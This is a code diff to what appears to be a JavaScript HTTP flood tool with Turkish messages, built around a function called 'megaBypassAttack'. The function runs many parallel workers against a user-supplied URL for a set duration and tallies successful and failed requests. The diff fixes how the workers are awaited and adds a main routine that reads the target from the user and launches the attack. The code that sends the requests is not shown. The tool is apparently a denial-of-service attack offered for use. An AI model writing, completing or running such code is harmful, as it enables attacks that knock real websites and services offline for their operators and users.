@@ -179,7 +179,20 @@ async function megaBypassAttack({ method, url, duration, threads }) {
 
     const workers = Array.from({ length: threads }, () => worker());
     logStatus('Saldırı aktif!', 'green');
-    await Promise.all(workers.map(async (worker) => {
-  await doSomething(worker);
-}));
+    await Promise.all(workers);
 
+    console.log(`\n✅ Başarılı istek: ${successCount}`.green);
+    console.log(`❌ Başarısız istek: ${failCount}`.red);
+    process.exit(0);
+}
+
+// Ana akış
+(async () => {
+    try {
+        const input = await getUserInput();
+        await megaBypassAttack(input);
+    } catch (err) {
+        console.error(`\n🚫 Hata: ${err.message}`.red);
+        process.exit(1);
+    }
+})();
